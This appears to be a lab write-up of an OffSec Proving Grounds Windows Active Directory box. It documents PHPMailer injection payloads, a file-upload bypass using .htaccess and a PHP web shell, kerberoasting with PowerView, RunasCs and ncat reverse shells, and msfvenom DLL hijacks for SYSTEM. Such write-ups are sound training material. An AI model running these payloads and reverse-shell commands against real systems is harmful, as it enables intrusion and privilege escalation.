---
tags:
  - Proving Grounds
  - Windows
  - File upload
  - .htaccess
  - SeManageVolumePrivilege
  - dll hijack
  
icon: simple/gnometerminal
---


# Box name

!!! info "Box details"  
    https://portal.offsec.com/machine/access-38168/overview  
    **Difficulty:** Medium  
    **OS:** Windows


## Enumeration

Nmap shows the following ports open:

```
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-11 14:16:56Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
443/tcp   open     ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open     mc-nmf        .NET Message Framing
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

# Plus some high ports in the 49000 range

```

Quick look over a few basic things:  
- smb does not have null auth enabled (nor guest account)  
- domain is access.offsec  
- port 80 has a website running (more on that later)  
- winrm is open


### Website on port 80

This is a website for an event. Not many functions to it, other than a couple of interesting ones: 1) a contact form; 2) a "buy tickets" function that lets you upload a file. Before going into the details below, it's worth noting that using ffuf on the website we found an uploads directory where we can see whatever we upload on the buy tickets function being stored (assuming it's accepted).

#### Contact form

The contact form just returns 'Unable to load the "PHP Email Form" Library!' when you submit the form. This could mean this is a dead end. Or it could mean that it is trying to do something that exposes it to some vulnerability. A quick search for PHP Email Form CVE shows a few interesting candidates: PHPMailer has CVE-2016–10033 and CVE-2016–10045. Both of these are command injection in the email field which can get a shell written somewhere (details: https://medium.com/@brave___/cve-2016-10033-php-mailer-remote-code-execution-46d6a5a9cda0).

Tried a few different payloads to make this work, but shell.php isn't being written in the uploads folder:
- "injection\" -OQueueDirectory=C:\Windows\Temp -Xuploads/shell.php.jpg server"@pwnd.com  
- "injection\" -OQueueDirectory=C:\Windows\Temp -Xuploads/shell.phpt server"@pwnd.com  
- "injection\" -OQueueDirectory=C:\Windows\Temp -Xuploads/shell2.php server"@pwnd.com  
- "injection\" -OQueueDirectory=C:\Windows\Temp -Xuploads\shell2.php server"@pwnd.com  
- "injection\" -OQueueDirectory=C:\Windows\Temp -XC:/inetpub/www/uploads/shell2.php server"@pwnd.com  
- \"Attacker\\' -OQueueDirectory=C:\Windows\Temp -Xuploads/shell.php.jpg server\"@test.com  
- \"Attacker\\' -OQueueDirectory=C:\Windows\Temp -Xuploads/shell.phpt server\"@test.com  
- \"Attacker\\' -OQueueDirectory=C:\Windows\Temp -Xuploads/shell2.php server\"@test.com  
- \"Attacker\\' -OQueueDirectory=C:\Windows\Temp -Xuploads\shell2.php server\"@test.com  
- \"Attacker\\' -OQueueDirectory=C:\Windows\Temp -XC:/inetpub/www/uploads/shell2.php server\"@test.com  

#### Buy tickets

Using Burp Suite intruder, we enumerate all file extensions that are accepted. We find the following: .php.jpg, .php2.jpg, .php4.jpg, .php6.jpg, .php8.jpg, .phpt.jpg, .pht.jpg, .phtm.jpg, .phtml.jpg, .php%00, .phpt, .php\x00. There is no check for the file magic bytes, so we don't need to worry about that. We also used intruder to test the different special character that might break file extension validation. We use this script to generate about 500 different extension variations that we can check:

```
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.phar' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.php8' '.phpt' '.pht' '.phtm' '.phtml' ; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

Here is what the intruder set up on Burp Suite looks like:

```
POST /Ticket.php HTTP/1.1
Host: 192.168.146.187
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.146.187/
Content-Type: multipart/form-data; boundary=----geckoformboundary8e7e9fcafb240588b46c3bf6bd780c13
Content-Length: 2074
Origin: http://192.168.146.187
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundary8e7e9fcafb240588b46c3bf6bd780c13
Content-Disposition: form-data; name="your-name"

htb
------geckoformboundary8e7e9fcafb240588b46c3bf6bd780c13
Content-Disposition: form-data; name="your-email"

htb
------geckoformboundary8e7e9fcafb240588b46c3bf6bd780c13
Content-Disposition: form-data; name="ticket-type"

pro-access
------geckoformboundary8e7e9fcafb240588b46c3bf6bd780c13
Content-Disposition: form-data; name="the_file"; filename="shell.php.jpg"
Content-Type: application/x-php

<?php system($_REQUEST["cmd"]); ?>
------geckoformboundary8e7e9fcafb240588b46c3bf6bd780c13
Content-Disposition: form-data; name="submit"

Purchase
------geckoformboundary8e7e9fcafb240588b46c3bf6bd780c13--

```

We find no shortage of different extensions that work (i.e., the web shell is uploaded). Now let's use ffuf to test if we can find command execution:

`ffuf -u http://192.168.146.187/uploads/FUZZ?cmd=whoami -w wordlist.txt`

None of the webshells triggered. Even with the shell uploaded, the system was doing a good job of not executing anything malicious. Let's change that!

## Foothold

Apache servers use .htaccess (hypertext access) files to change server behavior at the level of a specific directory. This can be used for access control, redirection, error pages, etc. The .htaccess file taking effect depends on the AllowOverride setting in the main config. We can craft the following .htaccess file and upload it via the tickets functionality:

```
AddType application/x-httpd-php .jpg
```

Now we can get the server to treat .jpg files as applications. So we upload a usual `<?php system($_REQUEST["cmd"]); ?>` web shell as shell.jpg and we can get command execution on the server! This gives us a shell as svc_apache. This user doesn't have many privileges, and the flag is not here. I did the basic priv esc stuff looking for credentials, checking for stored keys, running services, open port etc. In C:\xampp\ there is a passwords file, but that led nowhere. 

## Privilege Escalation
Checking C:\Users we can see svc_mssql is also present in the box, so that's my obvious lateral movement target. The ports we found with nmap indicate this is an AD environment, and service accounts are typically kerberoastable. So let's try this here.

```
# Throughout this box I used the ticket functionality to upload files to the target. Did the same for PowerView in this case.
Import-Module ./PowerView.ps1

# The output of this command gives us the confirmation that svc_mssql is kerberoastable
Get-DomainUser * -spn | select samaccountname

# Let's extract the hash
Get-DomainUser -Identity svc_mssql | Get-DomainSPNTicket -Format Hashcat
```

We crack the hash and get the password for the user. Although nxc with smb confirms that the credentials are valid, we can do little else with it in terms of code execution. Winrm is open on this box, but the credentials don't work for that. In order to complete our lateral movement, we use RunAsC to leverage our existing shell as svc_apache and turn it into a svc_mssql shell. There are a few ways to do that:

```
# I uploaded a netcat binary to the box and did this (it runs the shell as a backgrounded process)
.\RunasCs.exe svc_mssql trustno1 ".\ncat.exe 192.168.45.100 9001 -e cmd.exe" -t 0

# An alternative I saw in another write up
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 192.168.45.100:9001
```

## Root

Running `whoami /priv` shows us we have `SeManageVolumePrivilege`. This gives the account some defrag powers, which means the account needs to be able to access anything. I spent some time trying to enable the privilege, unsuccessfully. When looking directly for way to exploit it, there is an exploit that not only enables the privilege but also changes the permissions in C:\ (which cascades down) in a way that every user can access anything in the system now (https://github.com/CsEnox/SeManageVolumeExploit/). With this, we are now able to read the flag in the Administrator's desktop.

However, this is not actually root. If we want persistence, lateral movement across the AD, etc. we need to leverage our read/write permissions into an actual root shell. The basic concept is to get a process that runs as system to load a malicious .dll file. I found three ways to do this for this box, but only one of them worked for me.

1) WerTrigger
https://github.com/sailay1996/WerTrigger

Reading the OffSec briefing for this box, this is what they actually state as the intended path. The idea is to get an error report process to load our malicious dll from C:\Windows32\ I could not get this to work on my box. I tried it both with the dll that comes in the PoC as well as creating a custom one, and in both cases the exploit fails to load the dll.

2) tzres.dll

```
# Generate a malicious dll rev shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.100 LPORT=9001 -f dll -o tzres.dll

# Move the shell to C:\Windows32\wbem\
mv tzres.dll C:\Windows32\wbem\

# Run systeminfo
systeminfo
```

In theory this is supposed to throw an error and get us a reverse shell. In my case systeminfo happily displays the system info and I don't get my shell. Troubleshooting this with Claude it could be something about being in a 64-bit system but with a 32-bit shell. I tried things like copying to C:\Windows\Sysnative\wbem\ instead of system32 and then running C:\Windows\Sysnative\systeminfo.exe but that also didn't trigger anything.

3) C:\Windows\System32\spool\drivers\x64\3

This one finally worked for me.

```
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.100 LPORT=9001 -f dll -o Printconfig.dll

copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\

# In powershell

$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
```

Essentially this is a way of replacing the printer dll and getting it to execute. The CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} is the printer-config COM class. CLSID (Class Identifier) is a unique 128-bit number used by the Windows Registry to identify specific software components, applications, or system folders. It acts as a shortcut for the OS to locate and launch programs, Control Panel applets, or specific settings.

This is where I found it:  
https://oscp.adot8.com/windows-privilege-escalation/whoami-priv/semanagevolumeprivilege

List of dll's we can hijack (includes all of the above and more):
https://sirensecurity.io/blog/dllref/

Comprehensive list of dll hijack
https://github.com/wietze/hijacklibs
